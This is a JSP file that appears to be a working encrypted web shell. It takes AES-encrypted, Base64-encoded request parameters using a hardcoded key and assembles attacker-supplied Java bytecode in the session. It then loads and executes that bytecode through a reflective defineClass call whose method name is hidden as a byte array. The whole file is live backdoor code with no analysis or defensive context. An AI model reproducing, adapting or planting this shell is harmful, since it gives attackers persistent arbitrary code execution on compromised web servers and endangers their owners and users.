<%@ page import="java.util.*" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.util.regex.Pattern" %>
<%@ page import="java.lang.reflect.Method" %>
<%
    List<Object> myContext = new ArrayList<>();
    myContext.add(response);
    String k="e10adc3949ba59ab";// aes密钥 123456 md5的前16位
    String r = "";
    Map map = request.getParameterMap();    // 取密文
    Set<Map.Entry> entrySet = map.entrySet();
    for (Map.Entry entry : entrySet) {
        r += ((String[]) entry.getValue())[0];
    }
    byte[] cText = new sun.misc.BASE64Decoder().decodeBuffer(r); // 根据请求参数编码更换 当前：base64
    byte[] mText; // 解密后的明文
    try {
        Cipher c= Cipher.getInstance("AES");
        c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
        mText = c.doFinal(cText);
        String sText = new String(mText);
        if (Pattern.matches("[\\w.]{1,40}@.+", sText)) {
            String first = sText.substring(0, sText.indexOf('@'));
            String seconed = sText.substring(sText.indexOf('@') + 1);
            myContext.add(seconed);
            Class.forName(first).newInstance().equals(myContext);
            return;
        }
        if (mText[0] == -54 && mText[1] == -2 && mText[2] == -70 && mText[3] == -66) {
            session.setAttribute("k", mText);
        } else if (session.getAttribute("k") != null) {
            byte[] org = (byte[]) session.getAttribute("k");
            byte[] tmp = new byte[org.length + mText.length];
            System.arraycopy(org, 0, tmp, 0, org.length);
            System.arraycopy(mText, 0, tmp, org.length, mText.length);
            session.setAttribute("k", tmp);
        }
        try {
            byte[] data = (byte[]) session.getAttribute("k");
            Method m = ClassLoader.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,67,108,97,115,115}), byte[].class, int.class, int.class);
            m.setAccessible(true);
            ((Class) m.invoke(this.getClass().getClassLoader(), data, 0, data.length)).newInstance().equals(myContext);
            session.setAttribute("k", null);
        } catch (Exception e)  {
            return;
        }
    } catch (Exception e) {
        return;
    }
%>